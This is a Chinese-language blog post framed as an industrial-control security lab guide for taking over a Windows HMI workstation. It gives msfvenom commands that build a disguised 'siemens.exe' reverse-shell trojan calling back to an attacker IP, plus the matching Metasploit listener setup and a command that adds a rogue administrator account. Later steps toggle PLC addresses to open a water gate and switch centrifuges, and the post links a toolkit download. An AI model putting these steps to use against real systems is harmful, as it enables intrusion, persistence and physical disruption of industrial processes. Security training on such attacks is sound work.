---
layout: post
title:  "工控上位机攻击步骤（windows）"
date:   2018-11-24 
author: co0ontty
cover: '/assets/img/posts/swj-4.png'
categories: 工控 windows shell ALL
tags: 工控 windows shell ALL
describe: 工控安全实验指南-攻击上位机
---

## 攻入上位机获取控制权限实验说明

#### 一：针对上位机的windows系统制作shell反弹木马

1.在linux里使用工具包中的msfinstall文件安装msf攻击套件（kali操作系统中默认集成该工具），具体步骤如下：  
1.使用cd命令进入到工具包文件夹中  
2.使用命令赋予安装程序相关权限  

```shell
 chmod +x msfinstall
```

3.使用命令安装msf  

```shell
./msfinstall
```

2.获取攻击机的ip地址及端口  
![avatar](/assets/img/posts/swj-1.png)  
lo显示为网线连接的网络信息，en0显示的是无线连接的网络信息（后续实验默认使用192.168.199.137为攻击机ip）  
3.生成shell回弹木马  
如下图在终端中直接输入以下命令生成木马程序  

```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.199.137 LPORT=7777 -f exe -o /Users/co0ontty/siemens.exe  
lhost和lport为攻击机ip和端口
参考Frp使用教程可以实现通过跳板的外网渗透
```

（lhost为攻击机ip，lport为攻击机接收shell的端口，-o 后的参数需更改为攻击机保存木马的文件夹）  
![avatar](/assets/img/posts/swj-2.png)  
4.运行msfconsole连接shell  
1.终端中直接输入msfconsole使用（第一次输入需要配置数据库，默认全部选择yes）  
2.如下图设置exploit和payload  

```shell
Use exploit/multi/handler  
Set payload windows/meterpreter/reverse_tcp
```

3.设置攻击机ip和监听端口  

```shell
Set lhost 192.168.199.137  
Set lport 7777
```

4.运行程序  

```shell
run
```

配置完成如下图所示  
![avatar](/assets/img/posts/swj-3.png)  
5.获得上位机权限  
1.将木马拷贝到上位机中运行（win10及以上系统需要右键使用管理员身份运行）  
2.攻击机获得反弹的shell（如下图所示）  
![avatar](/assets/img/posts/swj-4.png)  
6.新建管理员账户  
1.新建账户  
![avatar](/assets/img/posts/swj-5.png)  
2.将新建的账户提升为管理员  

```shell
Net localgroup “Administrators” 123 /add
```

3.使用远程桌面连接，并使用该账户登陆  
7.读取工控设备基本信息  
1.打开工控管理软件，双击项目打开项目  
2选择打开项目试图选项，进入组态视图（如下图所示）  
![avatar](/assets/img/posts/swj-6.png)  
3.选择相应plc，打开plc变量选项，双击打开所有变量查看变量表  
![avatar](/assets/img/posts/swj-7.png)  

#### 二：使用工具修改相关地址变量达到预期效果

下面使用的工具存在于工具包中测试文件夹中(工具包下载地址：https://download.csdn.net/download/weixin_38830346/10868092 )  
环境配置：  
1.运行前请将snap7.dll和snap7.lib拷贝到你的操作系统对应的版本的System32(32位)或SysWOW64(64位)下  
2.连通192.168.1.8  
一：水闸开关测试  
1.打开PLC调试.exe  
2.读取I  1.0的参数  
3.通过更改I 1.0 的参数值来改变水闸的开关状态（可改变的参数为0和1，默认0为关闭状态1为开启状态）  
二：离心机测试  
1.打开PLC调试  
2.读取Q 2.0，Q 2.1，Q 2.2，Q 2.3 的参数  
3.通过更改这四个地址的参数来改变这四个离心机的状态 （可改变的参数为0和1，默认0为关闭状态，1为开启状态）  
